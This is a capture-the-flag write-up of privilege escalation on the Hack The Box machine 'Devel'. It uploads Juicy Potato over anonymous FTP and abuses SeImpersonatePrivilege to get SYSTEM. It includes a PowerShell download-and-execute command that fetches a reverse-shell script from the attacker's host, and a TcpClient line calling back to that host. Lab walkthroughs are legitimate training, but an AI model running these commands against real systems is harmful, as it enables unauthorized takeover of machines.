# Shell as iis apppool

First, check who we are and our privileges:

```cmd
c:\windows\system32\inetsrv>whoami /all
whoami /all

USER INFORMATION
----------------

User Name       SID                                                           
=============== ==============================================================
iis apppool\web S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

We have a few potential exploits here. We can potentially run Rogue/Juicy Potato as we have `SeImpersonatePrivilege` and are a network service, but that depends on our Operating system version. Let's check that:

```cmd
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          14/6/2021, 1:49:42 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.448 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.525 MB
Virtual Memory: In Use:    616 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::cd1a:453e:6381:9e7e
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

We're on Windows 7. I [[15 - Shell as Network Service#Trying Juicy Potato|tried Juicy Potato]] on Granny, and couldn't get it working due to not being able to extract a CLSID on Windows Server 2003. But there are [plenty](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/) listed for Windows 7.

Let's try to serve the exploit. As this is an x64 system, the x86 version we tried on Granny won't work - so I'll need to find a binary for x64. Luckily [the releases page](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) has one. I already had this downloaded, and used `locate` to find it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ locate JuicyPotato.exe
/home/mac/Documents/exploits/JuicyPotato.exe
```

I tried a few methods of downloading the file with a HTTP server, before realising I could just use FTP to upload it - however, I wasn't sure where the file would land. I did some digging, and found my shells in `c:\inetpub\wwwroot`:

```cmd
c:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\inetpub\wwwroot

14/06/2021  02:14 ��    <DIR>          .
14/06/2021  02:14 ��    <DIR>          ..
18/03/2017  02:06 ��    <DIR>          aspnet_client
17/03/2017  05:37 ��               689 iisstart.htm
14/06/2021  01:58 ��                 6 test
17/03/2017  05:37 ��           184.946 welcome.png
14/06/2021  02:10 ��            38.680 whoops.asp
14/06/2021  02:14 ��             2.763 whoopsie.aspx
               5 File(s)        227.084 bytes
               3 Dir(s)  22.279.733.248 bytes free
```

This is where IIS files usually are, but I didn't know if it would be different with FTP.

I uploaded the exe:

```bash
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:mac): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put JuicyPotato.exe
local: JuicyPotato.exe remote: JuicyPotato.exe
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
348468 bytes sent in 0.43 secs (783.7077 kB/s)
```

Then tried to execute using the first CLSID on the list:

```cmd
c:\inetpub\wwwroot>JuicyPotato.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {555F3418-D99E-4E51-800A-6E89CFD8B1D7}
JuicyPotato.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {555F3418-D99E-4E51-800A-6E89CFD8B1D7}
This program cannot be run in DOS mode.
```

I tried a couple more CLSIDs and a different port, but no luck. I looked up the error, and found [this post](https://superuser.com/questions/476808/i-am-getting-this-program-cannot-be-run-in-dos-mode-in-windows-xp):

![[Pasted image 20210614123703.png]]

So I need to turn on binary mode. [This post](https://docs.oracle.com/cd/E19120-01/open.solaris/819-1634/remotehowtoaccess-60496/index.html) shows us how:

```bash
ftp> binary
200 Type set to I.
ftp> put JuicyPotato.exe 
local: JuicyPotato.exe remote: JuicyPotato.exe
200 PORT command successful.
150 Opening BINARY mode data connection.
226 Transfer complete.
347648 bytes sent in 0.28 secs (1.1910 MB/s)
```

This time it executed! But it wasn't the right architecture, apparently:

```cmd
c:\inetpub\wwwroot>JuicyPotato.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
JuicyPotato.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
This version of c:\inetpub\wwwroot\JuicyPotato.exe is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need a x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.
```

It was then I realised I'd misread the `systeminfo` - the processor type is `x64`, but the system is `x86`.

No bother - we have an `x86` version too. Let's upload it:

```bash
ftp> put Juicy.Potato.x86.exe 
local: Juicy.Potato.x86.exe remote: Juicy.Potato.x86.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
263680 bytes sent in 0.33 secs (789.3519 kB/s)
```

Then execute it:

```cmd
c:\inetpub\wwwroot>Juicy.Potato.x86.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
Juicy.Potato.x86.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 414
......
[+] authresult 0
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\inetpub\wwwroot>whoami
whoami
iis apppool\web
```

It seemed to work, but didn't pop us out a shell as SYSTEM. I think this may be because it launches the process, but does so in the background - on the [Github](https://github.com/ohpe/juicy-potato) we can see it opening a separate command shell. So maybe we need to send ourselves a shell instead.

I considered using a [[Reverse Shells#Powershell|powershell reverse shell]], but didn't know how Juicy Potato would handle the flags and quotation marks - so I just searched "juicy potato reverse shell".

[This hacktricks page](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato) had a few examples - I could use `nc.exe` if I uploaded a shell to the box, but there was an equally nice [powershell example](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato#powershell-rev).

I copied across a `minirev.ps1` script I'd used previously (download [here](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5)), and edited the connection details:

```powershell
$socket = new-object System.Net.Sockets.TcpClient('10.10.16.211', 414);
```

I served it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel/www]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

And used this command:

```bash
c:\inetpub\wwwroot>Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.16.211:8080/minirev.ps1')" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.16.211:8080/minirev.ps1')" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 1337
......
[+] authresult 0
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

After a few seconds, the webserver was hit... and so was my listener!

![[Pasted image 20210614132807.png]]

We can now grab both flags:

![[Pasted image 20210614132849.png]]

And that's the box!

![[Pasted image 20210614132531.png]]